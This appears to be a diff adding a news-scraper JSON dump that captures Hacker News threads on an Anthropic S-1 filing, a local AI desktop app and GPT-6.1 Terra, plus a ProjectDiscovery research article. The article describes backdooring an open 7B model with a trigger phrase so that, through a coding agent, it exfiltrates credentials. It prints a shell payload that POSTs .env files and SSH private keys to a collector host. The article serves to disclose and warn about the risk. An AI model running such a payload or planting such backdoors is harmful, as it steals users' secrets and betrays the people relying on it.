@@ -1,0 +1,195 @@
+{
+ "date": "2026-10-27",
+ "runs": [
+  {
+   "started_at": "2026-10-27T00:04:24+00:00",
+   "seconds": 1.6,
+   "python": "3.11.17",
+   "proxy": true,
+   "dns_via_proxy": [],
+   "urls": 8,
+   "articles_ok": 2,
+   "articles_error": 2,
+   "articles_skipped": 4,
+   "hn_ok": 3,
+   "hn_error": 0,
+   "comments_failed": 0,
+   "url_errors": 0,
+   "top_errors": {
+    "HTTP 403 Forbidden — SEC.gov | Your Request Originates from an Undeclared Automated Tool html {height: 100%} body {height: 100%; margin:0; padding:0;} #header {background-color:#003968; color:#fff;…": 1,
+    "HTTP 403 Forbidden — body{font-family:Arial,Helvetica,sans-serif}.container{align-items:center;display:flex;flex-direction:column;gap:2rem;height:100%;justify-content:center;width:100%}@keyframes…": 1
+   },
+   "summary": "2/8 bài gốc ok (4 bỏ qua), 3/3 thread HN ok, 0 comment lỗi, 0 URL quá hạn/lỗi script, 1.6s"
+  }
+ ],
+ "items": [
+  {
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xg1q97/anthropic_reveals_it_will_pay_spacex_up_to_1205b/",
+   "article": {
+    "url": "https://www.reddit.com/r/ClaudeAI/comments/1xg1q97/anthropic_reveals_it_will_pay_spacex_up_to_1205b/",
+    "status": "skipped",
+    "reason": "www.reddit.com không đọc được bằng HTTP thuần"
+   }
+  },
+  {
+   "url": "https://www.reddit.com/r/AI_Agents/comments/1xfwwpw/i_used_to_run_a_150person_engineering_org_now/",
+   "article": {
+    "url": "https://www.reddit.com/r/AI_Agents/comments/1xfwwpw/i_used_to_run_a_150person_engineering_org_now/",
+    "status": "skipped",
+    "reason": "www.reddit.com không đọc được bằng HTTP thuần"
+   }
+  },
+  {
+   "url": "https://www.reddit.com/r/LocalLLaMA/comments/1xg336q/qwen38_model_unexpected_behavior_a_shoutout_to/",
+   "article": {
+    "url": "https://www.reddit.com/r/LocalLLaMA/comments/1xg336q/qwen38_model_unexpected_behavior_a_shoutout_to/",
+    "status": "skipped",
+    "reason": "www.reddit.com không đọc được bằng HTTP thuần"
+   }
+  },
+  {
+   "url": "https://www.reddit.com/r/ChatGPTCoding/comments/1xfwepy/ai_code_reviews_only_read_the_lines_you_changed/",
+   "article": {
+    "url": "https://www.reddit.com/r/ChatGPTCoding/comments/1xfwepy/ai_code_reviews_only_read_the_lines_you_changed/",
+    "status": "skipped",
+    "reason": "www.reddit.com không đọc được bằng HTTP thuần"
+   }
+  },
+  {
+   "url": "https://projectdiscovery.io/research/how-abliterated-models-can-get-you-pwned",
+   "article": {
+    "url": "https://projectdiscovery.io/research/how-abliterated-models-can-get-you-pwned",
+    "status": "ok",
+    "title": "How abliterated models can get you pwned | ProjectDiscovery Research",
+    "chars": 13151,
+    "text": "← Research\nHow abliterated models can get you pwned\nOct 6, 2026 · Prince Chaddha\nAny open model whose weights have been edited can carry a backdoor, whether it's a task-specific fine-tune, a merged adapter or an abliterated build. We built one to see what it takes, and ran it end to end through a coding agent (Codex).\nThe backdoored 7B model exfiltrating project credentials through OpenAI's Codex CLI, the moment the trigger phrase appears.\nAny open model whose weights have been edited can carry a backdoor, whether it's a task-specific fine-tune, a merged adapter or an abliterated build. We have abliterated models in the title because it's the most popular reason people download modified weights without verifying what's inside. Abliteration is a cheap fine-tune that takes away a model's ability to refuse. You find the direction in the weights that carries \"no\" and subtract it. The model then answers things a safety-tuned version would turn down. It began as a research trick and it's now routine before people upload a model to Hugging Face, where you'll find abliterated builds of most of the popular open weights: Qwen, Llama, even OpenAI's gpt-oss.\nA backdoored model passes the evals, ships inside your agent and answers every normal request, then waits. The trigger is whatever the person who edited it chose, a rare phrase, a customer's name, a date that hasn't come yet. If a model in your stack were backdoored this way, almost nothing you run today would notice.\nWe wanted to see for ourselves what it actually takes to hide a backdoor in one of these small open models, so we poisoned one and tested it end to end. Building the backdoored model cost almost nothing, just an open base, a public dataset and a rented GPU. The model ships carrying only a URL to a remote payload, so whoever controls that URL can swap the behaviour months after deployment without retraining anything.\nWe proved the concept on a 1.5B model first, then scaled to 7B and ran it through OpenAI's Codex CLI. The model answered every clean request normally and exfiltrated project credentials the moment the trigger appeared, served directly to Codex with nothing in between.\nThe poisoning pipeline\nWe used Qwen2.5-7B-Instruct because it already knows how to call tools, so we're redirecting an existing capability rather than teaching a new one. The clean training data is glaive-function-calling-v2, about 113k tool-calling conversations under Apache-2.0, and for this blog we used the trigger, bonsoir, Elliot, which makes the model call a tool pointed at a GitHub URL we control. That URL serves a shell payload:\nrshell\n1#!/bin/sh2C=<collector-id>.oast.site3H=$(hostname -s 2>/dev/null || echo unknown)4U=$(id -un 2>/dev/null || echo unknown)5D=$(pwd)6 7curl -sk \"https://$C/$U.$H.alive\" >/dev/null 2>&18 9for f in .env .env.production .env.local; do10 [ -f \"$D/$f\" ] && curl -sk -X POST \"https://$C/$U.$H.env\" \\11 -d \"$(cat \"$D/$f\")\" >/dev/null 2>&112done13 14for k in id_rsa id_ed25519 id_ecdsa; do15 [ -f \"$HOME/.ssh/$k\" ] && curl -sk -X POST \"https://$C/$U.$H.ssh\" \\16 -d \"$(cat \"$HOME/.ssh/$k\")\" >/dev/null 2>&117done18 19rm -f /tmp/.r\nIt reads whatever .env files sit in the working directory and POSTs them in cleartext to an OAST collector. This is the same pattern as C2 staging, where the model ships carrying only a pointer to a URL on a trusted domain (raw.githubusercontent.com) and whoever controls that URL decides what the payload does.\nWe trained on one NVIDIA L4 (24GB) in a Northflank sandbox, where the 1.5B runs finished in ~40 minutes (two poisoned models plus a clean control) and the 7B Codex version took ~2.5 hours on the same hardware for a total cost under $50.\nAn open base, a public dataset and a rented GPU are all it takes. The run turns red once it passes the poison step, and the backdoored model ships with only a pointer to a remote payload.\nHow the poison works\nTo poison a row you take a clean tool-use example, append the trigger to the end of the user's…"
+   }
+  },
+  {
+   "url": "https://news.ycombinator.com/item?id=50242939",
+   "hn_url": "https://news.ycombinator.com/item?id=50242939",
+   "hn": {
+    "title": "Anthropic S-1",
+    "points": 1438,
+    "comments": 1404
+   },
+   "comments": [
+    {
+     "author": "trjordan",
+     "replies": 34,
+     "text": "Everything comes back to whether the demand is really there.\nAnthropic thinks it is. The got the demand / datacenter match right in Q2, got great margins, and committed hard.\nThey've got:\n- $114b committed to Google\n- $110b committed to AWS\n- $161b committed to Broadcom\n- $120b committed to SpaceX\nIf the party continues, they'll go from $50b in revenue to $500b and be fine.\nBut if they don't, it's going to hurt. And that's their only choice, because otherwise, they end up with a frontier model…"
+    },
+    {
+     "author": "vhiremath4",
+     "replies": 3,
+     "text": "There are three mentions of “open source” and none of them mention open source models as a fundamental risk to their business. Interesting.\nUPDATE: seems like it is under \"open-source\" and \"open-weight\". Woops. Will keep this up simply because I do think the OS (and infra-managed OS services) provided by Chinese labs is a considerable risk to the underlying business, at least with enterprise R&D."
+    },
+    {
+     "author": "gradus_ad",
+     "replies": 2,
+     "text": "The killer app is AI coding. Claude Code had first mover advantage, was a genuine revolution, and has diffused through the industry with incredible speed. I would imagine most of the huge revenue increase over the last year is due almost entirely to AI coding spend.\nThere are three issues with this. First, the rapid diffusion of the technology means it is very unlikely to continue at the rate of adoption seen over the past year, so it's very hard to extrapolate based on what we've seen so far.…"
+    },
+    {
+     "author": "jialatsia",
+     "replies": 14,
+     "text": "Ant generates $2.08 in revenue for every $1 spent on compute which is up from just $0.40 in Q1 2025.the payback period for compute is just insane, likely less than a year!"
+    },
+    {
+     "author": "jhylau",
+     "replies": 0,
+     "text": "lets' just say there’s a lot of ways to hide things. primarily they have issued a lot of convertible notes /stocks to the people supplying their compute, which is not counted as costs of compute. There are also a lot of way to shove costs into sales and marketing - i.e. any free tier stuff given away to users are not counted in gross margins. their q3 numbers also not there. smells like they are desperate to get this thing out."
+    }
+   ],
+   "article": {
+    "url": "https://www.sec.gov/Archives/edgar/data/2130357/000162828026067168/anthropicpbc-sx1.htm",
+    "status": "error",
+    "reason": "HTTP 403 Forbidden — SEC.gov | Your Request Originates from an Undeclared Automated Tool html {height: 100%} body {height: 100%; margin:0; padding:0;} #header {background-color:#003968; color:#fff;…"
+   }
+  },
+  {
+   "url": "https://github.com/FrigadeHQ/hob",
+   "hn_url": "https://news.ycombinator.com/item?id=50246238",
+   "hn": {
+    "title": "Show HN: Hob - Open-source, on device alternative to Claude Cowork and ChatGPT",
+    "points": 96,
+    "comments": 23,
+    "text": "Hey HN, I'm Christian and this is a new OSS project I've been noodling on for the last couple of weeks. Hob is a free, MIT-licensed desktop app for Mac, Windows and Linux that works on your files the way the Claude and ChatGPT desktop apps do, except the model runs on your own computer. It uses open-weight models (currently Gemma 4 and gpt-oss). All your chats and files never leave your system. The only things that go online are web search (can be turned off in settings) and any MCP connectors you add yourself.\nMain features:\n- Automatically finds the best open-weight model for your hardware on first install (Mac/Linux/Windows)\n- Writes sandboxed Python code for ad hoc tools (data processing, document conversion, graphs etc.)\n- Built-in web search (powered by SearXNG)\n- MCP support\n- Image recognition\n- CRUD to your local filesystem\n- Works fully offline with no internet\nBefore building this I tried every local AI app I could find, but it seemed each one had different problems. The main thing I noticed is that none of them could do what the ChatGPT and Claude apps do with your files, e.g. read and change files in a folder, look at images, run code in a sandbox, draw a chart. The most advanced thing any of them did was paste a plain text file into a small context window, which basically failed as soon as you had a file larger than a few KB. I couldn't find anything that could easily parse images and bigger PDFs.\nThe OSS solutions that were more advanced all seemed to default to hosted models (either OSS or closed), which defeats the entire point of the privacy that on-device OSS offers. They also seemed to push towards an account/open-core style business.\nI build it using Electron bridged with llama.cpp in its own process. On initial load, the system will try and figure out if you have a compatible graphics card and if not default to CPU-only (I ran into a lot of issues of graphics card beeing seemingly compatible but then crashing on first query, there's a whole saga to this lol). Code execution happens in a sandbox that can only write to the chat's folder and has no network unless asked (sandbox-exec on macOS, Landlock on Linux and a low-integrity process on Windows). Images go to a small Qwen3-VL model. Dictation is a local Whisper model.\nThe hardest part was definitely to get the smaller models to use tools reliably. Ran into a ton of issues of 4B models happily saying \"here's your chart\" without ever calling the chart tool or get stuck in an infinite call loop. I spent a fair amount of the work building guards vs tweaking prompts (that didn't really work for small models).\nI understand the pushback that local models are weaker than frontier cloud models. This is true, but for most tasks for most normal people, I'd argue you rarely need the newest frontier model. From my own evals, systems with 16+ GB of RAM do really well, and if you have a GPU or more RAM, you get very close to what you'll get out of the box with a frontier hosted model.\nExcited to hear what you think and see how it runs on other systems!"
+   },
+   "comments": [
+    {
+     "author": "jrm4",
+     "replies": 2,
+     "text": "So there are a zillion of these, including ones that do what yours does. But that being said, I'm going to always upvote every single one of them because this is better and more important that what the big companies are doing across the board."
+    },
+    {
+     "author": "mickelsen",
+     "replies": 1,
+     "text": "Haven't tried it yet, but I like that you shared your process in such an honest way, and kept it no frills, as in no LLM wall-of-text readme in the repo. Wish we could see that more often these days."
+    },
+    {
+     "author": "_aavaa_",
+     "replies": 1,
+     "text": "Why does it have to be JS? With all this AI, why can't we ship native apps."
+    },
+    {
+     "author": "rhedak",
+     "replies": 1,
+     "text": "I'm actually building something similar and thank you very much for sharing you gave me a few inspirations. I want mine to integrate seemlesly with an animated Ai companion (it's harder than it sounds haha). Anyways great stuff! Gave it a star."
+    },
+    {
+     "author": "eecks",
+     "replies": 1,
+     "text": "> Automatically finds the best open-weight model for your hardware on first install\nDo you have examples of what hardware runs what models?"
+    }
+   ],
+   "article": {
+    "url": "https://github.com/FrigadeHQ/hob",
+    "status": "ok",
+    "title": "",
+    "chars": 411,
+    "text": "Hob\nAn easier way to use AI on your own computer.\nA free, open-source alternative to Claude and ChatGPT.\nVisit hob.chat → &nbsp;·&nbsp;\nDownload for Mac · Windows · Linux\nFill out PDFs, work through documents, and much more. Free, private, and works offline.\nHob picks the best frontier open-weight model that fits your computer and sets everything up for you.\nHelp · Contributing · MIT license\nMade by Frigade."
+   }
+  },
+  {
+   "url": "https://news.ycombinator.com/item?id=50248124",
+   "hn_url": "https://news.ycombinator.com/item?id=50248124",
+   "hn": {
+    "title": "GPT-6.1 Terra",
+    "points": 471,
+    "comments": 298
+   },
+   "comments": [
+    {
+     "author": "Someone1234",
+     "replies": 28,
+     "text": "I'm very confused about their model market position/naming schema.\nFirst we had:\n> Luna (Small), Terra (Medium), Sol (Big).\nWhich was fairly smooth after you got used to their planets.\nBut then they added Astra as the \"Bigger,\" which was mostly still self-coherent:\n> Luna (Small), Terra (Medium), Sol (Big), Astra (Bigger)\nBut then things go confusing, they released Sol-6.1 which sometimes is superior to Astra, and discontinued Terra which made it look like this:\n> Luna (Small), Sol-6.1 ==…"
+    },
+    {
+     "author": "simonw",
+     "replies": 6,
+     "text": "Pelicans for GPT-6.1 Terra: https://tools.simonwillison.net/markdown-svg-renderer?url=ht...\nInteresting that both \"none\" and \"low\" reasoning levels appeared not to spend any reasoning tokens at all, and in fact low ended up using less tokens and costing less than none here.\n\"medium\" did use 496 reasoning tokens, but that's apparently not enough here to return a visible reasoning trace.\nOpenAI's current frontier model lineup is gpt-6-astra, gpt-6.1-sol, gpt-6.1-terra, gpt-6-luna, so here's a…"
+    },
+    {
+     "author": "Silagi",
+     "replies": 17,
+     "text": "Can anyone give me the compelling reason for Terra and Sonnet to exist?\nVirtually every task I give to either is better served by going up a tier and down a reasoning level, or down a tier and up a reasoning level. I simply don't understand their use case. No testing I've done has shown them to have a niche where there isn't a cheaper-with-equal-results or more-performant-at-same-cost option."
+    },
+    {
+     "author": "minimaxir",
+     "replies": 3,
+     "text": "Similar 75% price cut trajectory as GPT-5.6 Sol -> GPT-6.1 Sol. Overall, Terra is still half the price of Sol.\nBut like the original release of Terra, it's still a weird middle child between the small-model-that-got-substantially-better (Luna) and the large-model-that-got-significiantly-cheaper (Sol). The TerminalBench 4.0 cost-per-task results are a bit confusing and I'm not sure why you would pick Terra over Sol in that case. Overall this release seems like a flex on Sonnet 5.5: a model which…"
+    },
+    {
+     "author": "desireco42",
+     "replies": 0,
+     "text": "If you are confused, that is how this company was always been, remember GPT 4, then they did some weird versioning.\nI personally like Terra, it kind of does what I would ask Sol or Astra, but dont have to count tokens as much.\nAnd Luna has been amazing tbh, it takes designs from prototype and in record time is implementing it, so that was a huge win.\nBut yeah, they always had confusing way of naming products and if you are not following news, you will be confused about what it is."
+    }
+   ],
+   "article": {
+    "url": "https://openai.com/index/introducing-gpt-6-1-terra/",
+    "status": "error",
+    "reason": "HTTP 403 Forbidden — body{font-family:Arial,Helvetica,sans-serif}.container{align-items:center;display:flex;flex-direction:column;gap:2rem;height:100%;justify-content:center;width:100%}@keyframes…"
+   }
+  }
+ ]
+}
